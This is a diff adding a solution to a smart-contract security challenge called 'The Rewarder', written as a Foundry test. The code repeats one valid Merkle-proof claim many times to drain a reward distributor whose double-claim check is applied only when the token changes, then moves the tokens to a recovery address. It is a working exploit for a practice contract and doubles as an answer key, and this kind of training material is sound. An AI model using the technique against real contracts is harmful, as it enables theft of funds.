@@ -148,7 +148,33 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        // 1. Look up the player's own (valid) entry in each distribution
+        (uint256 dvtAmount, bytes32[] memory dvtProof) = _playerEntry("/test/the-rewarder/dvt-distribution.json");
+        (uint256 wethAmount, bytes32[] memory wethProof) = _playerEntry("/test/the-rewarder/weth-distribution.json");
+
+        // 2. How many times we can repeat each claim before the distributor runs dry
+        uint256 dvtClaims = dvt.balanceOf(address(distributor)) / dvtAmount;
+        uint256 wethClaims = weth.balanceOf(address(distributor)) / wethAmount;
+
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
+
+        // 3. Same claim repeated, grouped by token: the "already claimed" bitmap
+        //    is only checked when the token changes and on the last claim
+        Claim[] memory claims = new Claim[](dvtClaims + wethClaims);
+        for (uint256 i = 0; i < dvtClaims; i++) {
+            claims[i] = Claim({batchNumber: 0, amount: dvtAmount, tokenIndex: 0, proof: dvtProof});
+        }
+        for (uint256 i = 0; i < wethClaims; i++) {
+            claims[dvtClaims + i] = Claim({batchNumber: 0, amount: wethAmount, tokenIndex: 1, proof: wethProof});
+        }
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokens});
+
+        // 4. Send everything to the recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
@@ -187,5 +213,23 @@ contract TheRewarderChallenge is Test {
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
         }
+    }
+
+    // Finds the player's reward amount and Merkle proof in a distribution file
+    function _playerEntry(string memory path) private view returns (uint256 amount, bytes32[] memory proof) {
+        Reward[] memory rewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+
+        bytes32[] memory leaves = new bytes32[](rewards.length);
+        uint256 index = type(uint256).max;
+        for (uint256 i = 0; i < rewards.length; i++) {
+            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
+            if (rewards[i].beneficiary == player) {
+                index = i;
+                amount = rewards[i].amount;
+            }
+        }
+        require(index != type(uint256).max, "player not in distribution");
+        proof = merkle.getProof(leaves, index);
     }
 }
